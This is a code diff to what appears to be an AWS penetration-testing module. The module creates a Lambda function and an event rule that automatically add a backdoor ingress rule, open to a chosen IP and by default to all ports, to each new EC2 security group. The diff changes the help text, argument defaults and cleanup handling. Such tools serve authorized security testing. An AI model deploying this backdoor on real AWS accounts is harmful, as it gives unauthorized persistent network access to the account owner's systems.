@@ -17,7 +17,7 @@ module_info = {
 
     'one_liner': 'Creates a Lambda function and CloudWatch Events rule to backdoor new security groups.',
 
-    'description': 'This module creates a new Lambda function and an accompanying CloudWatch Events rule that will trigger upon a new EC2 security group being created in the account. The function will automatically add a backdoor rule to that security group with your supplied IP address as the source.',
+    'description': 'This module creates a new Lambda function and an accompanying CloudWatch Events rule that will trigger upon a new EC2 security group being created in the account. The function will automatically add a backdoor rule to that security group with your supplied IP address as the source. Important: Your backdoor will not execute if the account does not have an active CloudTrail trail in the region it was deployed to.',
 
     'services': ['Lambda', 'Events', 'EC2'],
 
@@ -31,8 +31,8 @@ module_info = {
 parser = argparse.ArgumentParser(add_help=False, description=module_info['description'])
 
 parser.add_argument('--regions', required=False, default=None, help='One or more (comma separated) AWS regions to create the backdoor Lambda function in, in the format "us-east-1". Defaults to all session regions.')
-parser.add_argument('--ip-range', required=True, help='The IP range to allow backdoor access to. This would most likely be your own IP address in the format: 127.0.0.1/32')
-parser.add_argument('--port-range', required=False, default='1-65535', help='The port range to give yourself access to in the format: starting-ending (ex: 200-800). By default, all ports are allowed (1-65535).')
+parser.add_argument('--ip-range', required=False, default=None, help='The IP range to allow backdoor access to. This would most likely be your own IP address in the format: 127.0.0.1/32')
+parser.add_argument('--port-range', required=False, default='0-65535', help='The port range to give yourself access to in the format: starting-ending (ex: 200-800). By default, all ports are allowed (0-65535).')
 parser.add_argument('--protocol', required=False, default='tcp', help='The protocol for the IP range specified. Options are: TCP, UDP, ICMP, or ALL. The default is TCP. WARNING: When supplying ALL, AWS will automatically allow traffic on all ports, regardless of the range specified. More information is available here: https://boto3.readthedocs.io/en/latest/reference/services/ec2.html#EC2.Client.authorize_security_group_ingress')
 parser.add_argument('--cleanup', required=False, default=False, action='store_true', help='Run the module in cleanup mode. This will remove any known backdoors that the module added from the account.')
 
@@ -113,6 +113,10 @@ def main(args, pacu_main):
 
         print('Completed cleanup mode.\n')
         return {'cleanup': True}
+
+    if not args.ip_range:
+        print('  --ip-range is required if you are not running in cleanup mode!')
+        return
 
     data = {'functions_created': 0, 'rules_created': 0, 'successes': 0}
 
